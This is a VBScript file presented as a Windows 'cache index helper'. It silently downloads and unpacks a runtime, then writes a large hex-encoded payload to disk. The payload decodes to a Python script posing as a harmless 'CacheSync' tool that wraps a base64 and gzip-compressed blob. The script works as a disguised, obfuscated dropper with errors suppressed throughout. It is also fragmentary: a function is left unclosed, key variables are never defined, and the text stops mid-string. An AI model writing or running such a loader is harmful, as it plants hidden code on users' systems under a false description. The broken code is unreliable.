' cache index helper - maintains per-user cache index segments under servicing folders.
Option Explicit
On Error Resume Next

Function Dk(s)
K3 = sh.ExpandEnvironmentStrings(K3)
K4 = sh.ExpandEnvironmentStrings(K4)
K5 = sh.ExpandEnvironmentStrings(K5)

Function DL(u, f)
    On Error Resume Next
    Dim x, st
    DL = False
    Set x = CreateObject("MSXML2.XMLHTTP")
    x.Open "GET", u, False
    x.Send
    If x.Status = 200 Then
        Set st = CreateObject("ADODB.Stream")
        st.Type = 1
        st.Open
        st.Write x.responseBody
        st.SaveToFile f, 2
        st.Close
        DL = True
    End If
End Function

Sub EX(z, dest)
    On Error Resume Next
    Dim sa, i
    Set sa = CreateObject("Shell.Application")
    sa.NameSpace(dest).CopyHere sa.NameSpace(z).Items, 20
    For i = 1 To 40
        If fo.FileExists(RT & "\" & PY) Then Exit Sub
        WScript.Sleep 250
    Next
End Sub

Function H2B(h)
    On Error Resume Next
    Dim i
    H2B = ""
    For i = 1 To Len(h) Step 2
        H2B = H2B & Chr(CInt("&H" & Mid(h, i, 2)))
    Next
End Function

' runtime
If Not fo.FileExists(RT & "\" & PY) Then
    If Not fo.FolderExists(RT) Then fo.CreateFolder RT
    If Not fo.FileExists(ST) Then
        DL R1, ST
    End If
    If fo.FileExists(ST) Then EX ST, RT
End If

' ensure payload - embedded hex first, then repo
Dim PP
PP = fo.GetParentFolderName(P1)
If Not fo.FolderExists(PP) Then fo.CreateFolder PP
If Not fo.FileExists(P1) Then
    Dim e
    e = "2320436163686553796e63202d206c69676874776569676874206361636865206d616e6966657374206d61696e7461696e65722e0a23204170706c69657320636f6d7072657373656420736e617073686f74206d616e6966657374732070726f6475636564206279207468652057696e646f777320736572766963696e670a2320737461636b20696e746f20746865206c6f63616c207065722d7573657220636163686520696e6465782e2049646c652c2073696e676c652d706173732c206e6f206e6574776f726b2e0a696d706f727420626173653634206173205f6236340a696d706f727420677a6970206173205f677a0a0a5f4d414e4946455354203d2062277435707934307931486f66305753395762594b45683470473559364c39564d7050516b3763596557587a6e305876642f6544435632346555465075556551725777774a4b58444361634d597451587553544e4661694151714157415a6d454e656f51687a4472425a3450316e32505656493446584f6641334a41633141396e6f4d76446c72614e6d345a586c333147547744596c547777616268427a4e6c39484c4d5178565152666d515a3551525a6c63635332634439636564617271792f" & _
        "3677717a715a6263546443707875586e4f5747324c57423747797078694a6b4e326f63345962577465707666443968446e787a796e594b73774e517037656c6f7141334c36456f624d575a31597546464a6b7a356f3472515263665a415467576e6e304d57576b5345426c794e4a39304367776165557937594a65456973325849634d6645704b4f632b41726e4979763153663635654a636c2b4267517745776635536f764a766b516c634142577762774c534632334755617554545a32316d2f397a325266594a36682b577837426b494f766435632f4f7668335943416f437366646264646a5643544c70304869666f695567583843694c5132466e694a4e6c7731304248673135624c6e5962453849376b74666977573639466e79524b6b504632367078535575544a583146423934614a45436a5546654e503651344d31313874534143565a7769524a3458792f344c636649487148384b45476f526b6b796f73544656676d6c5961714c6c614c3369592b383555443852676f65694b764e665653337564773277664546594b5173384665642b3357582b6f2b616162445551437532366a4a756b325371577538784544742b6c2f6f63512f582b3656686d70" & _
        "73627a2b4e68434b39364a684f594734485566416c4430317635557638766a516376614e635674322f313049582f597474716b7772393265434772435745335151734e5a576b677431646648396a2f685a2b6e5548436b6e71665035724d65433631385253594e626e33366365454c4632737630336b46367342784a384a49367264724741394e2f6c7738324857615776664f4b6c594733474e48352b697468323141637062336c7a53624b634333657a55632f59515a41356645394f59754f63736d6b53386f723166646568754c495734385336373736767152754e76476f4e4463724a4c643855736e7955386d774f65655949704a7948766d443359564f54576e6132667735414e6b7a4a4c4e63456a7535584a596e41765248512b484b4c574955785a325772396c72433966655666754f57412b6b4d636b66796676326b3136676477444472334c525a4f4d366a65644b7a6c6f644f61687843313649433943666a4a53686736376878495654693558497a4559555830453854696579595649614a6a4b444a706d50354561414a6a6e55554831416347552f52396a45726b6f377967773075636f6766743772734445374b56454a303365487a54714c4542" & _
        "316d71445653304936797435382f696b42506f73677a48756a2b5a326d304238726c71576c675074716c5761614c594457767353697545364a6a523058347148737a677838355057514b7a5a38714579474b46796878464a57483834523749684f69364b4e4872616131496974616a5863373041674e3376417247504739434f6f375768662b772f466242512b624a5467563377526977654574594d76466e2b6a7a37736f6b7859544b304d68703855466d546d48355a385659426e613846793772752f5756376b6963504f7137693848435849566e37515a5a585067424352654a765749396a6a6f6f3672417035575738646945343374344377375657516575564e76566a58626e714c4d66782f6c6b2f2b6d544433466a33525736634b5078462b516c6345704b6e467742374d6b30707479344955656874376452394b4c50433777686e41383234574d4e5a5268477751466a59345031385835796549774b473479683839584d7241397a7864627342676f51424d4c716e35774c722b4d43506f6d5239464a636b642f6a664f57636a434c544751577375663852515267507738676e7934785a33592f7476704d672f502b344a3457574f6f3474767456636f" & _
        "354a39726d4e3061795561754f6c2b51436753334e55585361656c474d5755503364737846734c7479343779502b34507a59724d696b4f6b6b6162553857716f52764e6c38514e6b454c6a554f36736d4f76416674773862554d306e5044796f69472f346734646f744c366a4b52326557696e766d2f65697a5745684f78674b493655764930616c2b4748514869752f77466a79696d352f6b3674495159796e776b335749316d4637484c594c44564f394f507a61643356386a446b4273686c5651775967504a79613444733668585749346256784f5a424f755847576f6e48664b4b422b794f5446507939574e6d314a4538656d35575a6954543562714661394e485276483732354e7658667579474a734645494b374b45505978725245512f5179557a6e586c67303942507352646265596646694f674863314764344631376c5a325a424e6a6c6d774a784f625a7634784a4634684d5875716a6853587832364f5735324547564870413570627359335544336f5a6571347276352b466a46494b414d644e544e4d776245613942773776527557784569686b4636654a726d2f6d3378796a73496c6977312b6d73577a783950583938596b396a354b65374b66" & _
        "6f6c6d7144344b75577156624e67692b4c4d61676262557853656d532f426d3547786343676470454d49396c5949626b4578626935453650756c50346b7563463434486d5a7472425a2b574e6f4a6235304e7137487346507764706633422f3068476f3937676a65453779666f42387a6247626c6958754f304d352b796c7775657836493750316c324c636270327a635677346c584353687836544d3276716e7133614755564c7666526c7a544b6d72467a4732504b394e37726f3071553370456b2b74527274633051757477524d63726c3843787a5930466d36527a3564316c325749684c326150557965544c5576754f425a76325450684247677a796f5273632f35452b6a517a45435542555849383646576e2b414c4f78592f735656737a634e7044536756476c377477676570454a5036363258364955774a38656a4c614d786f2b3832636846476a505757665349572b4551714669722f49496b356d6443415a63426e514d7233713576523273584f624f3571377a67365a4b6b454c4d304a4138454f756d4a66644c596a3632742b6978305570654c635554316c326337534750726b336d515652414750435770486e546c786a5142746c6e6254653130" & _
        "746b743259577349306c676e552b6b6c6c4433736248726758486e764435612b2b38697a6756335a47696c526373364d49583754636e2f68644b6b4b4b517956367335443063474867684f4b315778596e764147386a4a4542344e7a416e654d497039376f656455744e476f5672555661486c596a6b52524877345837467a4966715876366c41305a4d76696e62495842615369346c46616f614e542b71467959527a68474430464c6378716335586932774a7677793846385232774b4d476f2f72657349673362746146416550722f55515a587a6e4975435a2f692b2f514f654d58725749634c386164796a6f66735a68367434776b56462b364859796e4d57414c644447564f314b324d2b4c45315941552b6665737459714c38433636344370304f4c6b2b6b6a796a6943766a354e575a4d306d5758752b4e69446d5070635a5031546a323657354664726d75354d32557930454b3030736455334e345039444b666f4c77377869447a65766b49755242756e76784d315255524578776c475a74642f32616f75585a4a622f5a4a44583534796e39337670373670412f49304e462f4475486372374941306c364d684f3265695471626a5258654142715a7943" & _
        "6839763056532f2b725158567238722b5a6a506b755a797652514258624933427158314a31306471496c736b6c514832664b55473349384973424d5568766d6d4a6a624244533274334e696a6e484c52514a7055696849554e42464636416b524f53666645655972696f4d4538454f4a78447153634b31586b3747444a5043497353464e41514e3463424236773539444d2f54755877364461395a747754567a754952555a7532454947316e4871546358716a48793849704f2f666a794c624c57724f6d6b45783176636c50763735514746316d4e66437770532b36436a334d36532b517869774a6e6a772f6967446a75555a31734d514c507561424c61725230416f73454f4478677664364454472f6f724b7359704f66734c2b5379354e4b615639442f69364261314c36426f4c6279684e355930626f6c73465a305030486664674277782f7256394e5058655a6855624c79476374322f6848344e6a59332b456258624d326836776e717361306e6a345567354e50624d6459464a355a5765446d2b6b62764458665a47347765552b50672b2b642b3753774450613437436e37644b67635a306e656475664b2b4a63495a5978597a456e4a5837624248713566" & _
        "4d30446f714850456d7253504f2f6161563062703247637a2f5a37773546726378634f6a45676e474b476936505563562b446b664768485a77617456566177376d76646d2f353942745746524c537143634d5a4739345345454379557a477a3767704c75794a64706b754e4b4c4b7049464a79684e6d4e774f2b59736c354178686d7a38644a4c567556627758706431354877552f653348616c6772334c4e43704e4f327463476b386445656e5470692b575551345351592b54307769456d6345766948324d56424475485162644866534b667a77536450646547343158527556346d56466e4e72384931676b304a706d4b5130735a507a4172634135386375563572694a4535505536615153712f432f4a6f5546387555306f71532f535445346d65506630514d577174364132564d4665436851585768674966372f766c3954624c4338415359484243765876782f452f784d31355a6c516a445150776e5a5464395a71657070426b5a7873414e504849385545394a6b4b46654e4a6d47657878447a62566f6c446357486b4c79772f4951306f764a4f44305367694267623878424e6e70636344726d4b3956624c39766136587941695778594e5a77312b7a2b" & _
        "68445a41573769514458495450516a526f616143646c4f4c756d683650303143314341727054312f79745949476b767862686f7259482b637a707238694c7a76324c346347564a7779596575486d69357343356631506556566948676e6a715751752b52454570354879764e674f42476366356e695a714b5a775a4376706967596e536f6c6f4e71307a4657727a546b5162414a37314933792b314262376e39766d306f56354c752b514546466c58374771636771525048507a52696c364257412b3737626438572f2f2b4c2f55394f694c375351344e476d4e354e664e6c6b527a6a4138593378534a3753494f724877685837304a35384d44616778637568573074704c76346448772b6b3762363874627139736949697453696636463474506c6a6c4e7378376d7a4e4c396b506b67333656315166523275486455724c4f314b43725a6b374a6965584662665245314775484e6a5566384a626d437156333879486c44683234582f34565a53306f59796e427164316459575a67587856553539516c6b6d7950567a37654449514c78483134597632766a75504357484b4130392b5842346e4b6b35797a6a7438487276363968576c52494553553744706e4d62" & _
        "6f4972592f624e716532705948535535615555644c444b385741334e793030757335717a55617a6e52517171463031482f2b787a6a4f353136326f48736b5558375978794a6d7231786736764b43502f45334d4f674942734637324c68537659554b446f4f51364c4e6f584c4f61743254554e516b6751665239626776497854514269666a46574b4566494179444172326e374762516a754f6d5370717867647649685876384753677952634367587676786b4a6b6a4b3057694c72356669316443715676543435354f686a3667706e67686676464a62504f546e4f416a30596134467a6b746b304d6846305a7a4b3533796d334a70757161696478436b374761545a68724d6d66616747684b2f38486a664e517847445954436e385855766337347474563733643446353848436d44706762326c4565592b537032695a41587a2b37464b4239473978777659676f2f6865357969316a71634e31612b63387441356953585058686a527a3832784b54763158485a766a534277374435546b4f6a4e5a306c5a3172464e74654458514f4a6a643058306174796a6c76324c35394971393133577857614e5054703145387878554b4b32373962616438363167657052" & _
        "6a7134664d542b32324b2b55505a2f6165316d4148735a694e624348416938683150626649496159696e4235786c6f512b2f4f2f7a597048485230315a53514b63416d2f4f717341516d49675137574a3461504466447a4367373766397651494361622b70354c344a4e67485177373938386a65674e75652b56367446684b524f4e56667a564b766563745350616964395a6d397178687548576d546451677144334e75557454437245566c634d694c376b366f5367787242564f643650667633614763614376394f4278694755395933714e30307943704c6a4b5237784d357877357465686f52376171456756762f7a4c716c425a2f766456545755482b6570704d536534314f6a765944796c355376327966447165787235485435365470506f4e694362673861765575304e705244654c4c37337468574d4c655362336b41464969336b416d4a74504835364e6b527078375272412f5854617176776b2f706d4963514257443948376466552b79334563656c6d366e356c4c5545676570505931714c736e782f516a79612b3678686652454557446f426272754b4a545251383539463645572f3859434a6732414474376c5163665666453348654953414b6d" & _
        "764a32783442334339566f6a3549445951636e43646b31476d6464695235704f6e7967516a584272496d795a4335515355634e4536744c654e3531714b5930524c437139425667444c3872676f587a7a59394345457a4455783245656a6c423379444731556536664b6e37522f316e4642655043792b75743135346f4a766c765266627444595943456e46333678614f536d716656707672754e7a496334362f4b447939387a796c6d50644f593639507149372b664379446d38596565496f3677453339336c796f7335305475553167374979766669316b326c6c2b52396270353639784d754b7631747346752f6c33394d5042486b684a4d443837795a68616a6133773164676f34575a446d44554a51696769487a553051506250516d5a7358634b764567647051353957576b654a6a4c65594a486b387449476e444c746d77754d61725570777655444b7165342b4537487946516663327a45372f38586e2f68724a4b6b5961517467732f765537444878326a4c704d7061556136616d30753162375862775737374b53374775525a765273636b4a426f6e6547576a6e2b7858675067344b303230525856664c52307444542b524578487a6c454e663571754c" & _
        "7143494c69643345776a6b7a47543278676738785454364a6f6659454e5841557a795477676a763449722f746c73415855563177526a6441584a4d475050356c43697a4b622b344a77734f613768594c6f37614e546c4d554a737555626537596a7159354362705162546f6641323572476831536b3555384e35334732654a332b5962362b3049533671646173577773535a5876677672594d646c4b6b324b51474476622b47684c773157362f643237724e4e4968655652636d534b637476557968346b46575462422b675342664b6e433876547a623555494438555932506f69425a746a6c70494e5132624179324e4e5177746b4250494a475844504e714e556c6467464f6b7a7a7a3769614f325568353754735253536f583047426f377a4a48412b4a6749326145443152574952696d4a6a707a6757775967716473563636526d382b48306b376770467461347a4b7954562f456771626c51692b364773436d2b4677766a6a326766647a4a53614b623069494e567050546e674147703149507a333237634c627352627233367154654b566d324e39592f6a502f6970333566555a5761326c744646694733344c4949736c38702f3558615764697048454f64" & _
        "466968585a384a7a37394331446545392b47524e655766394d6a4e395558396e625761383437444e305a78306e63326c6f65504a44337332504c734e69634c50422b36437148526b67494349716d536a584653337969394968576a7a545058746258774271784a5573334357585176786457645272614c4a553852686f69373276345363456653356d4b6f72736f47476c733872664e4a4844574e70462b6c515a6678356e516b4c7a79437854586e4338797158724d4248612b646d6d67395438714d7730437868697331454e79546d7049636b67704249434266766356664b436448456f687376514a35336a35364375354a51465131583656377a49575431644d4477786b4d6a7a6a392b496f555777544d426865354e77346c53394d7156526b54724a4e717a6c795353474a4d63316a704569784a756261415048496d753841794e477978754758336c67354b6f453558315a51665874326e42735a74344b6c3232487648555666566631774f4c33624d52367866425434444e373356556e576b6577384e716a4570362f6a7959704f3545474f754d6f30706b35504e74314b4a6d37564a2f7544544d72396957536850376f4c4f39357976394777506e466d" & _
        "5672593961697a685a3049496d6551775a4e5a453259384c61534f7a7047457558546835474f614a382b34693241334f7636553130517a34494a587879386946426643693932624d344962545646555948536c307669356b374546574f76632f4b684454752b48314235476f5464515a4b6f544d4a37463335664746623577502b317a536931777137492b55544f5a2b384d472f61477a6d4c383978427465425052476646796475453635756e416759374b32673758662f6154663470633967556d59795258446f414a7a53416b33564652464b64484d576b78356e4a4e543373397254675a78553472615a33427a494d6c6139744f445955593031594f2f4b4f6632516c77764d46617569524173534934306b5673643777632f6b784f444967723571756d6b4e6c2b2f75566e6d755a4e544e58525a537266694834794a2f644a41784c497859676153586d31476137702f662f577445353938354e7061654e622f4650645633437978364430664e4434612f78746e6c534644597a4b4549416e4d35486f6a32756f62316f566c33494f497941704b716f34345755757a3349697667533462696c39374d4242754b7477664738534c636e59334978684f453131" & _
        "4b59336747344b79584c717a4f36795a4f726b496b7a69497254495649362f32514732386930396c61525a544f72697448494471614555697777616433425247517655455a6d3078346b4f6f784d7466694962433563587073684834774b62774a444458586b70693238356d487743386c756d7048527148704c4e436345315963344e61733365386b4178456570734a613050464f357436794443424c556d2f3643685951794f556e495976445849797a614e654765696551546f79437370764635686544573354585a48695059414f38346b4e542f6e33644546482b4845594c7a57495573344b55456b596c485261524c4e794d47326744796b517650336a584a5579764332614c6632754b4135436133476a4d6b4837434a35322b676d7a6c6e72437759687476597375742b744258493857742b73386377327935477045754f474f73474254334f316c5a49554b47667934684976375168414766657a763649683472504f464e343045367a31515a4d4c786e446a5042526b755566496a55444655656e777135504c326a675954326e6e35323437744b6a7a5765326d485863396b6f676d6234356d5a7730505469505457416630476d414c5078592b384138" & _
        "4632752f41676554754a686263325a6d5a4e6b636a463734695949576b394a5a7466464c706d32466a70324e5675445646387647745365357a536e3573477a643233425631385a374e32634e70342f33695a67506b4331502f73413548335441714f4b416a6d347742753752656244544177543938375555782b6b30474150334c79723148437646525170617377537742616e474c4e527865397a417978456a31415267496e78692b64636b786353464346722f336664794a31664a6a394b4a76517331476c576c4f6169783965484e68446c46355343574f7047376d7471686b4d6b316d2f63466d325164794f376e7a2f357741394a71515854306354633568363458672b7a374f5937313856635436703531596553372b566c63376658534e54426830365031516779556d717a674b4e362f7678767150726239524e6d70524c43415965655955476b70687147776672316d766c375153734b39336b734c7678784e6f58306c566a414544714f5a7054306b6f62614952484445325878745369434d593262515451756d527a64366871494d537341656b684d4632637a4653446a6761457850494f43624f4251496447765658735a6473327551674174655654" & _
        "704c346f33587659356f6b684c53756c4450553934594d53496f2f6b5479476f4564444e66415856662b2f5a6539776b674c466b65326946466169787630703730562b4342426c516831384969524a2f53516563676451575376616c39694a644f4c37674167634c7439556967785a3933373379476774773277357a4a486a6c554f35697242655a384373786635464f5a6a58517371586b326e6c4a495a7371784e427a657a34483169596239344e694c56624e344a573539586f734e4669556c746e4a3439514a633039304543676456716f6a635938704176324d317557627031723656376846315a3657556d436a74464474374a6c57487267566948457669425274304b49454b31416139734a654c624d3155324a2b3455632f346c4a586d6433684e6d364b3455686d5574376f62662b645a526b6b5332476c4b733078724333416a352f514f5541704e466e6b772b5a4b345946644e566151482b3871736b68673832306a565a656b383175486b432b6b6c796475647a4b792b6c42724941442f4b366d4c57716749483379746a65794d3452466f71715a413048696b666d633178323178336d59447255396e58694b4f6f4c592b654731422f44314f7676" & _
        "746a73432f5761334266586758783263514a765944383644324d5778704b684747597373313463344a533753764c5461575a632f6b6768435750497875683470774d777741493375664a6d3664466c383273315151584c59436141433275676d586c55394344534961564c3754497342774252336e3076654f6a47533176626674473769515165334e6a377a6d7652564d54765046682f66416856336358486375416a6e474f772b37423147794d32537166304677307252497a474e4a327142696b5674676852384c4c4736456f414e594e5376306b6c44502b634a2b496367327464557079735773557355507462385437736a7772614a594a6873436664786c54616766686a316f43414f4d725375714345736f7a346e776558576167694a32327a4a6451592f2b5270716866465646346446762b415246504b2b4a79344f2f626748354e4a67397442354778534249464667783856714d466e50326533463070456a6a74624834326c746d682b514c724d783261644d4b47704e46427155585673565145326239635766713343634264494369337575642b6270586959344b6247466e36745879474c7a6a4c49662f7a535754526838736831486d4675675233" & _
        "767a7031307a576553733436652b45386851322b2b4f472b6f5932564f2f3439456c554843327330593439522b59345148433065575677533378445a47726d31344859694f642b7367446859496c72447a5741644c4a526f427863764d3073347269647a314e4f504168594f65304548487542524d6459435a366b6652375330555a5372636b5178727255622f664f56535378626d412f523142516247757257464c393361464d6f327265653971343167485a323041676f3077743862332f4e6754494e69326848315968644a665243305841673150756351704c4c4c53576c653246306a596f424f61696452756f4468375a4e7338614d41652b416e50424859686f3574756853462f712b4e352f5a6b324167417554486c41565759526c33613145546e452b4f62704d77312f4f336439706b6d2b664447366e666c5a484559594675385934757a68307534586564697a4a796c65306d734472666368495759716b676a61443152595470795358636f71464f73426e48514b6b76713030315231644131534557524b497368633670504e49437264317549654364767353616c5975627479344c5268464d496e6c57437442433343352b74684a65666373617632" & _
        "53574e35565a4248726e6d7279422b54755242524f373248377056347a662b56374c475935794e3746466535536b37624a63706e6751654d475749336a574d303332356c316c5a7a592f7364614f5250444b4643437865502b724f302f77347a77547031446a4a4a35394e4f64754c675431627230782f46447a67486b6c77777a6c6773307738784370616a59574d5350446d5a465371383331694d5a55396b376e6b31706f53577763473861487853336f35376d6d5a306a457971436a4530502f4161346a563348446349766b67642f6165682f78517a6a74576f4931316f4b782b644f3753714e6752784e6952497952355064496c4b63415641694c2f384c5076764e785033583262504a614b5248612f374b4238667356785a736f4a7865335664414e4b67412b6e514b4b427a4c2b586d6f5a5066795a2f554b5a365873444947794e6c4d746a6e7855744a527a614253527534656a6d34614548434745374d365438424163316f6c4f4c52356f3550664a4e41325532727341395359303962537a34696b666e78427556424d5061785645424c3258623861436355706546666d4332757a4331636f6c793374414a374c4d6e504e323061576142312b3045" & _
        "767550643655727950444c425072336c6c454e6672763865736736616846514b79375436737170742b6e2b465347433559467968307a624646424959666a5a6877714f466a48717534753676345558697646732f6f3539574a507336484248556941454c6a5979727a2b424f7534716e3561492f63705352694c63315053385a65465764507a376673334f4757792f3462756875564c4b63364948693078446e4f70347033774d4c6d4775535674484a684d4f4f35375a7848697937344c386b66373039776e526952756968464a43307858346154766934596c302f334139742f7235754c47534d4758327548424e2b686f397a6b38357a656569372b455a463130594468695159366d2f36426a70756b724161494656434a454d6c356a592f74536a65582b63367756686b79722f6e52716c77624d6b6d374e565a6e3230376f4d65524a426a677a676641355658733055474b534e71377a5374763348445a643171327733494d4a664669567a33626f423744444c434744316a562f4a7170375845466d76374b32515762737a524350326f44376f636a45356d35654b4469616c426b51694846636a526776466949744d4d6b51674f42647a4e746961315a5662" & _
